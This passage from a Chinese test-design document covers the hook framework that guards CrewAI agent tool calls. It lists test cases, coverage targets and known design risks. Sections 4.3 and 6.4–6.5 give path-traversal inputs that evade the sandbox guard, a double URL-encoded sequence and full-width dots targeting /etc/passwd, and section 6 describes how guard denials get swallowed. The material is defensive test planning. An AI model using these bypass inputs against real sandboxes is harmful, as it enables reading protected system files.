| **IT-SEC-006** | 安全 + 可靠性完整链路（BEFORE_TOOL_CALL → AFTER_TURN → SESSION_END） | 正常工具调用 → 累加 token → 结束会话 | CostGuard 有 token 记录，AuditLogger 有 session_summary，所有 metrics 一致 | P1 |
| **IT-SEC-007** | 预算超限后的工具调用被 CostGuard 拦截 | 先累加大量 token 超预算，再 dispatch_gate BEFORE_TOOL_CALL | CostGuard 的 before_tool_handler 抛出 GuardrailDeny | P0 |

### 3.3 适配层集成（6 个用例）

文件：`tests/integration/test_adapter_integration.py`

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **IT-ADP-001** | 适配层 + HookRegistry + 策略的端到端链路 | 加载策略 → 安装适配层 → 模拟 before_llm_call | BEFORE_TURN + BEFORE_LLM 事件被分发到策略 handler | P0 |
| **IT-ADP-002** | 适配层 before_tool_call → dispatch_gate → SandboxGuard 拦截 | 安装适配层 + 加载 SandboxGuard → 模拟 before_tool_call（路径遍历） | SandboxGuard 的 violations 有记录 | P0 |
| **IT-ADP-003** | step_callback → AFTER_TURN → CostGuard 累加成本 | 安装适配层 + CostGuard → step_callback 后查 CostGuard metrics | token 被正确累加（注意：step_callback 不直接传递 token，这里需要验证适配层的 ctx 构造） | P1 |
| **IT-ADP-004** | task_callback → TASK_COMPLETE → handler 被调用 | 注册 TASK_COMPLETE 的 MagicMock handler，触发 task_callback | handler 被调用 | P1 |
| **IT-ADP-005** | cleanup → SESSION_END → AuditLogger.session_end_handler | AuditLogger 注册在 SESSION_END，触发 cleanup | 审计文件包含 session_summary | P0 |
| **IT-ADP-006** | 多轮对话模拟（before_llm * 3 + step * 2 + tool * 1 + cleanup） | 模拟完整 Agent 生命周期 | 按正确顺序触发：BEFORE_TURN(1) → BEFORE_LLM(1) → BEFORE_LLM(2) → step → BEFORE_TURN(2) → ... → SESSION_END | P0 |

### 3.4 两层配置集成（4 个用例）

文件：`tests/integration/test_two_layer_config.py`

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **IT-CFG-001** | 全局层 + Workspace 层 handler 合并注册 | 全局层注册 TASK_COMPLETE handler，Workspace 层也注册 TASK_COMPLETE handler | `handler_count(TASK_COMPLETE) == 2`，dispatch 后两个 handler 均被调用 | P0 |
| **IT-CFG-002** | Workspace 层 handler 在全局层之后执行 | 两层都注册同一事件，通过调用顺序记录验证 | 全局层 handler 先被调用 | P0 |
| **IT-CFG-003** | 仅全局层存在时正常加载 | Workspace 目录下无 hooks/ 子目录 | 仅全局层的 handler 被注册 | P1 |
| **IT-CFG-004** | Workspace 层策略（strategies）也能被加载和注册 | Workspace hooks.yaml 包含 strategies 段 | 策略实例被创建并注册到 registry | P2 |

### 3.5 GuardrailDeny 传播流（3 个用例）

文件：`tests/integration/test_guardrail_deny_flow.py`

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **IT-GDF-001** | 策略 deny → dispatch_gate 抛出 → 调用方捕获 | CostGuard budget=0 → dispatch_gate BEFORE_TOOL_CALL | 调用方通过 `try/except GuardrailDeny` 捕获，`e.reason` 包含 "Budget exceeded" | P0 |
| **IT-GDF-002** | pending_deny 流程：before_tool_call deny → 存储 → step_callback 重新抛出 | 适配层中 dispatch_gate BEFORE_TOOL_CALL 抛 GuardrailDeny → 适配层 catch → _pending_deny → step_callback 时 raise | step_callback 抛出 GuardrailDeny | P0 |
| **IT-GDF-003** | dispatch（非 gate）中策略抛 GuardrailDeny 被吞掉，不中断后续 | 在 dispatch（非 dispatch_gate）中注册一个抛 GuardrailDeny 的 handler | 不抛异常，后续 handler 继续执行 | P1 |

---

## 4. 边界用例与风险区域

### 4.1 HookContext frozen 不可变性

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **ED-FRZ-001** | HookContext 创建后属性不可修改 | 创建 HookContext 后尝试 `ctx.tool_name = "new"` | `FrozenInstanceError` 异常 | P0 |
| **ED-FRZ-002** | HookContext 的 mutable 默认值（dict）不会跨实例共享 | 创建两个 HookContext，修改第一个的 `metadata` 内容 | 第二个实例的 `metadata` 不受影响 | P1 |

### 4.2 并发安全

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **ED-CON-001** | HookRegistry 实例级隔离——两个 registry 互不干扰 | 创建 registry_a 和 registry_b，各注册不同 handler | dispatch registry_a 不触发 registry_b 的 handler | P0 |
| **ED-CON-002** | CostGuard 不是线程安全的（记录为已知限制） | 文档化：CostGuard 的 `_total_input_tokens` 累加非原子操作 | 单线程场景（CrewAI kickoff 在 `to_thread` 中串行）下安全；多线程需要额外保护 | P2 |

### 4.3 SandboxGuard 正则边界

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **ED-SBX-001** | 双重 URL 编码（`%252e%252e%252f`）不被检测（已知限制） | `%252e%252e%252f` 经过一次 unquote 变成 `%2e%2e%2f`，仍是编码状态 | 不触发路径遍历检测——这是已知限制，需在设计文档中标注 | P2 |
| **ED-SBX-002** | Unicode 归一化绕过（如 `．．/` 全角句点） | `．．/etc/passwd` | 不触发检测——当前正则仅匹配 ASCII `.`，这是已知限制 | P2 |
| **ED-SBX-003** | 超长输入（10000 字符）不导致正则引擎性能问题 | 生成 10000 字符的正常文本 | 在 50ms 内完成检查，不抛异常 | P1 |
| **ED-SBX-004** | tool_input 为 None 时不崩溃 | `HookContext(tool_input=None)` 经过 `str()` 转换 | 不抛异常（`str(None) == "None"`，不包含危险模式） | P1 |

### 4.4 LoopDetector 哈希边界

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **ED-LPD-001** | 哈希碰撞风险：不同输入产生相同 MD5 前缀（理论存在但概率极低） | 文档化：MD5 前 16 字符（64 bit）碰撞概率约 `1/2^32`，对 Agent 场景可忽略 | 不需要测试，但需在设计文档中说明为何选择 MD5[:16] 而非更强的哈希 | P2 |
| **ED-LPD-002** | 哈希列表自动截断（`len > threshold*2` 时删除旧条目）不影响检测 | threshold=3，连续 10 次相同状态 | 第 3 次触发 deny，列表长度不超过 threshold*2 | P1 |

### 4.5 CostGuard 精度边界

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **ED-CST-001** | 浮点精度不影响 budget 判断 | budget=0.000001，accumulated cost 刚好等于 0.000001 | `>=` 判断成立，触发 deny | P2 |

### 4.6 HookLoader 异常安全

| ID | 描述 | Setup / Input | 预期行为 | 优先级 |
|---|---|---|---|---|
| **ED-LDR-001** | hooks.yaml 格式错误（非法 YAML）不崩溃 | hooks.yaml 内容为 `{{{invalid` | 优雅处理，打印 stderr 错误，不注册任何 handler | P1 |
| **ED-LDR-002** | strategies 段构造函数参数不匹配时跳过该策略 | config 中传递了类不接受的参数 | 跳过该策略，打印 stderr 错误 "failed to instantiate" | P1 |

---

## 5. 覆盖率目标

### 5.1 模块级覆盖率要求

| 模块 | 目标覆盖率 | 理由 |
|------|-----------|------|
| `hook_framework/registry.py` | >= 95% | 核心分发引擎，所有 handler 经过此路径 |
| `hook_framework/loader.py` | >= 90% | 配置加载是系统启动关键路径 |
| `hook_framework/crew_adapter.py` | >= 90% | CrewAI 集成适配层，映射逻辑必须正确 |
| `shared_hooks/sandbox_guard.py` | >= 95% | **安全关键**——输入消毒是第一道防线 |
| `shared_hooks/permission_gate.py` | >= 95% | **安全关键**——权限控制决策不能有盲区 |
| `shared_hooks/audit_logger.py` | >= 90% | 审计日志完整性直接影响合规 |
| `shared_hooks/cost_guard.py` | >= 90% | 预算围栏，错误可能导致超支 |
| `shared_hooks/loop_detector.py` | >= 90% | 循环检测，误判影响可用性 |
| `shared_hooks/retry_tracker.py` | >= 85% | 纯观测模块，风险较低 |

### 5.2 关键路径识别

以下路径必须 100% 被测试覆盖：

1. **GuardrailDeny 传播路径**：`handler 抛出 GuardrailDeny` → `dispatch_gate 传播` → `调用方捕获`
2. **SandboxGuard 四条正则**：路径遍历 / 危险命令 / Shell 注入 / 环境变量引用——每条正则至少 2 个测试用例（阳性 + 阴性）
3. **PermissionGate 三级决策**：DENY / ASK / ALLOW——每级至少 1 个测试用例
4. **CostGuard 双重检查**：after_turn_handler 检查 + before_tool_handler 检查
5. **LoopDetector 双路径**：after_tool_handler（_tool_hashes） + after_turn_handler（_turn_hashes）
6. **HookLoader deps 注入**：声明顺序 = 依赖顺序，后声明的策略可以引用先声明的

### 5.3 CI Gate 新增

在 v2 的 14 个 CI gate 基础上新增 4 个：

| Gate | 命令 | 失败动作 |
|------|------|---------|
| `hook_framework_unit_pass` | `pytest tests/unit/hook_framework/ tests/unit/shared_hooks/ -v` | fail |
| `hook_integration_pass` | `pytest tests/integration/test_hook_chain.py tests/integration/test_security_chain.py -v` | fail |
| `sandbox_guard_coverage_95` | `pytest --cov=xiaopaw.shared_hooks.sandbox_guard --cov-fail-under=95 tests/unit/shared_hooks/test_sandbox_guard.py` | fail |
| `permission_gate_coverage_95` | `pytest --cov=xiaopaw.shared_hooks.permission_gate --cov-fail-under=95 tests/unit/shared_hooks/test_permission_gate.py` | fail |

---

## 6. 设计隐患

在编写测试用例过程中发现以下设计隐患，需要在实现前确认或修复：

### 6.1 pending_deny 机制未在参考实现中体现

**问题**：12-hook-hardening.md 2.5 节描述了 `pending_deny` 机制——CrewAI 的 `@before_tool_call` 内部吞掉异常，需要适配层 catch GuardrailDeny 并存到 `_pending_deny`，在下次 `step_callback` 时重新抛出。但参考实现 `crew_adapter.py`（m5l30/m5l32）中 `@before_tool_call` 直接使用 `registry.dispatch`（而非 `dispatch_gate`），且没有 `_pending_deny` 字段。

**影响**：如果 CrewAI 的 `@before_tool_call` 确实会吞异常，那么安全策略（SandboxGuard / PermissionGate）在 BEFORE_TOOL_CALL 上的 deny 将无法阻断工具执行。这是 v3 安全保证的核心缺口。

**测试影响**：UT-ADP-011 和 IT-GDF-002 需要在实现 pending_deny 后才能通过。

**建议**：实现时必须在 `@before_tool_call` handler 中使用 `dispatch_gate`，并实现 pending_deny 缓存 + step_callback 重新抛出逻辑。

### 6.2 参考实现中 `@before_tool_call` 使用 dispatch 而非 dispatch_gate

**问题**：m5l32 的 `crew_adapter.py` 第 100-112 行，`@before_tool_call` handler 中使用的是 `registry.dispatch`（观测模式）而非 `registry.dispatch_gate`（拦截模式）。这与 12-hook-hardening.md 4.4 节描述的 "BEFORE_TOOL_CALL 执行链使用 dispatch_gate" 不一致。

**影响**：安全策略（SandboxGuard / PermissionGate）和成本围栏（CostGuard.before_tool_handler）都注册在 BEFORE_TOOL_CALL 上，但如果使用 dispatch（非 gate），它们抛出的 GuardrailDeny 会被吞掉，无法阻断工具执行。

**建议**：XiaoPaw v3 实现时，`@before_tool_call` 必须使用 `dispatch_gate`，并配合 pending_deny 机制处理 CrewAI 的异常吞掉行为。

### 6.3 CrewObservabilityAdapter 的 AFTER_TURN 不携带 token 信息

**问题**：参考实现中，`step_callback` 收到的是 `AgentAction` / `AgentFinish` 对象，这些对象不包含 `input_tokens` / `output_tokens` 信息。因此 AFTER_TURN 事件的 HookContext 中 `input_tokens == 0, output_tokens == 0`。CostGuard 的 `after_turn_handler` 依赖这些字段来累加成本。

**影响**：CostGuard 在通过适配层间接触发时，可能永远不会累加成本（token 始终为 0），预算围栏形同虚设。

**建议**：适配层需要从 CrewAI 的 LLM 回调或 context 中获取 token usage 信息，或者在 `@before_llm_call` / `step_callback` 中通过其他途径（如 CrewAI 内部的 `_token_process` 机制或 LLM response 对象）获取 token 数据。IT-ADP-003 用例会暴露此问题。

### 6.4 SandboxGuard 的双重 URL 编码绕过

**问题**：SandboxGuard 只执行一次 `unquote()`，双重编码（如 `%252e%252e%252f`）经一次解码后仍是 `%2e%2e%2f`，不会被路径遍历正则匹配。

**影响**：攻击者可以通过双重编码绕过路径遍历检测。

**建议**：考虑循环 unquote 直到值不再变化，或至少在设计文档中标注此为已知限制（T14 残余风险 MEDIUM）。ED-SBX-001 用例记录了这一限制。

### 6.5 SandboxGuard 不检测 Unicode 规范化绕过

**问题**：全角句点 `．`（.）不被 `\.\.[/\\]` 正则匹配。攻击者可以用 `．．/` 绕过路径遍历检测。

**影响**：与双重编码类似，属于 T14 残余风险。

**建议**：在正则前做 NFKC 归一化（`unicodedata.normalize("NFKC", input)`），或标注为已知限制。ED-SBX-002 用例记录了这一限制。

### 6.6 HookLoader 的 YAML 格式错误处理未明确

**问题**：参考实现中 `load_from_directory` 使用 `yaml.safe_load` 打开文件，但没有 try/except 包裹。如果 hooks.yaml 内容格式错误（非法 YAML），会抛出 `yaml.YAMLError` 且未被捕获，导致整个加载过程中断。

**影响**：一个格式错误的 hooks.yaml 可能阻止所有 handler 的加载，包括安全策略。

**建议**：在 `load_from_directory` 中添加 `try/except yaml.YAMLError`，格式错误时打印 stderr 警告并跳过。ED-LDR-001 用例验证此行为。

### 6.7 PermissionGate 的 ASK 级别行为不明确

**问题**：12-hook-hardening.md 描述 ASK 级别为 "需要确认"，但参考实现中 ASK 级别仅记录日志并放行，不实际阻断或等待确认。在飞书交互场景中，如何实现 "等待用户确认" 的交互流程？

**影响**：ASK 级别在当前实现中等价于 ALLOW + 日志记录，可能与用户的安全预期不符。

**建议**：明确 ASK 的语义——在 v3 首版中，ASK 等同于 ALLOW + WARNING 日志 + 审计记录。未来版本可以通过飞书卡片实现交互式确认。测试用例 UT-PMG-003 按当前实现（放行 + 记录）验证。

### 6.8 RetryTracker 的 "首次失败不算重试" 逻辑可能让人困惑

**问题**：RetryTracker 的 `total_retries` 只在 `prev > 0` 时递增（即第二次及之后的连续失败才算重试）。这意味着一个工具失败 1 次后成功，`total_retries == 0` 但 `successful_retries == 1`，导致 `retry_success_rate` 可能出现除零或非直觉结果。

**影响**：当 `total_retries == 0` 时，`retry_success_rate = successful_retries / max(total_retries, 1) = 1/1 = 1.0`，但实际只有 0 次重试，100% 的成功率没有实际意义。

**建议**：在 metrics 中增加 `total_first_failures` 计数，明确区分首次失败和重试失败。UT-RTR-003 用例精确测试了当前的计算逻辑。

---

## 附录 A：用例数量统计

| 模块 | 单元测试 | 集成测试 | 边界/风险 | 合计 |
|------|---------|---------|----------|------|
| HookRegistry | 12 | - | 1 | 13 |
| HookLoader | 14 | 4 | 2 | 20 |
| CrewObservabilityAdapter | 11 | 6 | - | 17 |
| SandboxGuard | 18 | 2 | 4 | 24 |
| PermissionGate | 10 | 2 | - | 12 |
| SecurityAuditLogger | 7 | 1 | - | 8 |
| CostGuard | 10 | 1 | 1 | 12 |
| LoopDetector | 8 | 1 | 2 | 11 |
| RetryTracker | 6 | 1 | - | 7 |
| 全链路/安全链路/Deny流 | - | 10 | 2 | 12 |
| **合计** | **96** | **28** | **12** | **136** |

> 注：单元测试数量与 2.x 节的编号不完全一致，因为部分模块额外增加了审计集成和 metrics 验证的用例（如 UT-SBX-017/018）。实际 TDD 实施时以本文档为准，编号仅供引用定位。

## 附录 B：测试优先级分布

| 优先级 | 含义 | 数量 | 实施时机 |
|--------|------|------|---------|
| P0 | 核心功能 / 安全关键路径——必须在实现代码前写好 RED 测试 | 68 | TDD 第一轮 |
| P1 | 重要边界 / 配置路径——实现核心功能后补充 | 48 | TDD 第二轮 |
| P2 | 文档化的已知限制 / 低风险路径 | 20 | TDD 第三轮或标记为 TODO |

---

## 文档版本

- **v1.0-draft**（2026-04-24）：首版，覆盖 Hook 框架 9 个模块的完整测试设计。
- 本文档与 [12-hook-hardening.md](12-hook-hardening.md) 和 [10-testing.md](10-testing.md) 联动维护。
- 每次新增/修改测试用例需同步更新附录 A 的用例统计。

---

**关联文档**：
- [12-hook-hardening.md](12-hook-hardening.md) -- Hook 框架设计文档（被测系统）
- [10-testing.md](10-testing.md) -- v2 测试策略（基线策略）
- [DESIGN.md](../DESIGN.md) -- 系统总纲
- [test-cases-for-known-risks.md](test-cases-for-known-risks.md) -- v2 已知风险测试矩阵
